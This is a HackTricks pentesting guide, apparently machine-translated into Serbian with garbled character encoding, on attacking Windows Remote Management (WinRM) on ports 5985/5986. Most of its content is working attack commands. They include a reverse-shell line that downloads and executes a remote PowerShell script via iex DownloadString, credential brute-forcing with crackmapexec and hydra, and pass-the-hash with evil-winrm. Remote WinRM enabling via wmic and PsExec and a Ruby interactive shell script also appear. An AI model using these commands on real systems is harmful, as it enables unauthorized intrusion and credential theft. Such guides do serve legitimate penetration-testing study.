# 5985,5986 - Pentesting WinRM

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) je istaknut kao **protokol od strane Microsoft-a** koji omoguÄ‡ava **daljinsko upravljanje Windows sistemima** putem HTTP(S), koristeÄ‡i SOAP u tom procesu. Osnovno je pokretan WMI-jem, predstavljajuÄ‡i se kao HTTP-bazirano suÄelje za WMI operacije.

Prisutnost WinRM-a na maÅ¡ini omoguÄ‡ava jednostavno daljinsko upravljanje putem PowerShell-a, sliÄno naÄinu na koji SSH funkcioniÅ¡e za druge operativne sisteme. Da bi se utvrdilo da li je WinRM operativan, preporuÄuje se provera otvaranja specifiÄnih portova:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Otvoreni port sa gornjeg spiska oznaÄava da je WinRM postavljen, Äime se omoguÄ‡avaju pokuÅ¡aji zapoÄinjanja daljinske sesije.

### **Iniciranje WinRM Sesije**

Da bi se konfigurisao PowerShell za WinRM, Microsoft-ov `Enable-PSRemoting` cmdlet dolazi u igru, postavljajuÄ‡i raÄunar da prihvata daljinske PowerShell komande. Sa poviÅ¡enim pristupom PowerShell-u, sledeÄ‡e komande mogu biti izvrÅ¡ene da omoguÄ‡e ovu funkcionalnost i odrede bilo koji host kao pouzdan:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Ovaj pristup ukljuÄuje dodavanje dÅ¾okera u `trustedhosts` konfiguraciju, korak koji zahteva paÅ¾ljivo razmatranje zbog svojih implikacija. TakoÄ‘e je napomenuto da moÅ¾e biti potrebno promeniti tip mreÅ¾e sa "Javna" na "Poslovna" na maÅ¡ini napadaÄa.

Pored toga, WinRM se moÅ¾e **aktivirati na daljinu** koristeÄ‡i `wmic` komandu, Å¡to je prikazano na sledeÄ‡i naÄin:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Ova metoda omoguÄ‡ava daljinsko podeÅ¡avanje WinRM-a, poveÄ‡avajuÄ‡i fleksibilnost u upravljanju Windows maÅ¡inama na daljinu.

### Testirajte da li je konfigurisan

Da biste proverili podeÅ¡avanje vaÅ¡e napadaÄke maÅ¡ine, koristi se komanda `Test-WSMan` da se proveri da li je cilj pravilno konfigurisan za WinRM. IzvrÅ¡avanjem ove komande, trebali biste oÄekivati da dobijete detalje o verziji protokola i wsmid-u, Å¡to ukazuje na uspeÅ¡nu konfiguraciju. Ispod su primeri koji prikazuju oÄekivani izlaz za konfigurisan cilj u poreÄ‘enju sa nekonfigurisanim:

* Za cilj koji **je** pravilno konfigurisan, izlaz Ä‡e izgledati sliÄno ovome:
```bash
Test-WSMan <target-ip>
```
Odgovor bi trebao sadrÅ¾ati informacije o verziji protokola i wsmid, Å¡to oznaÄava da je WinRM ispravno podeÅ¡en.

![](<../.gitbook/assets/image (582).png>)

* Nasuprot tome, za cilj **koji nije** konfigurisan za WinRM, to bi rezultiralo nedostatkom takvih detaljnih informacija, istiÄuÄ‡i odsustvo pravilnog WinRM podeÅ¡avanja.

![](<../.gitbook/assets/image (458).png>)

### IzvrÅ¡i komandu

Da biste izvrÅ¡ili `ipconfig` daljinski na ciljnog raÄunaru i videli njegov izlaz, uradite:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

MoÅ¾ete takoÄ‘e **izvrÅ¡iti komandu iz vaÅ¡e trenutne PS konzole putem** _**Invoke-Command**_. Pretpostavimo da imate lokalno funkciju pod nazivom _**enumeration**_ i Å¾elite da je **izvrÅ¡ite na udaljenom raÄunaru**, moÅ¾ete to uraditi:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### IzvrÅ¡i skriptu
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Dobijanje reverzne ljuske
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Dobijanje PS sesije

Da biste dobili interaktivnu PowerShell ljusku, koristite `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**Sesija Ä‡e se izvrÅ¡avati u novom procesu (wsmprovhost) unutar "Å¾rtve"**

### **Prisiljavanje WinRM-a da se otvori**

Da biste koristili PS Remoting i WinRM, ali raÄunar nije konfigurisan, moÅ¾ete ga omoguÄ‡iti sa:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Saving and Restoring sessions

Ovo **neÄ‡e raditi** ako je **jezik** **ograniÄen** na udaljenom raÄunaru.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Unutar ovih sesija moÅ¾ete uÄitati PS skripte koristeÄ‡i _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### GreÅ¡ke

Ako pronaÄ‘ete sledeÄ‡u greÅ¡ku:

`enter-pssession : Povezivanje sa udaljenim serverom 10.10.10.175 nije uspelo sa sledeÄ‡om porukom o greÅ¡ci : WinRM klijent ne moÅ¾e obraditi zahtev. Ako je Å¡ema autentifikacije drugaÄija od Kerberos-a, ili ako klijentski raÄunar nije pridruÅ¾en domeni, tada se mora koristiti HTTPS transport ili odrediÅ¡ni raÄunar mora biti dodat u TrustedHosts konfiguraciju. Koristite winrm.cmd za konfiguraciju TrustedHosts. Imajte na umu da raÄunari na listi TrustedHosts moÅ¾da neÄ‡e biti autentifikovani. MoÅ¾ete dobiti viÅ¡e informacija o tome pokretanjem sledeÄ‡e komande: winrm help config. Za viÅ¡e informacija, pogledajte temu pomoÄ‡i about_Remote_Troubleshooting.`

PokuÅ¡ajte na klijentu (informacije [ovde](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Hacking Insights**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## WinRM konekcija u linuxu

### Brute Force

Budite oprezni, brute-forcing winrm moÅ¾e blokirati korisnike.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### KoriÅ¡Ä‡enje evil-winrm
```ruby
gem install evil-winrm
```
ProÄitajte **dokumentaciju** na njegovom github-u: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Da biste koristili evil-winrm za povezivanje na **IPv6 adresu**, kreirajte unos unutar _**/etc/hosts**_ postavljajuÄ‡i **domen** na IPv6 adresu i poveÅ¾ite se na taj domen.

### Prosledi hash sa evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### KoriÅ¡Ä‡enje PS-docker maÅ¡ine
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### KoristeÄ‡i ruby skriptu

**Kod preuzet odavde:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## References

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Automatske Komande
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greÅ¡ke!

**Uvidi u Hacking**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o Hacking-u u Realnom Vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovija ObaveÅ¡tenja**\
Budite informisani o najnovijim nagradama za greÅ¡ke i vaÅ¾nim aÅ¾uriranjima platformi

**PridruÅ¾ite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite trikove za hakovanje slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
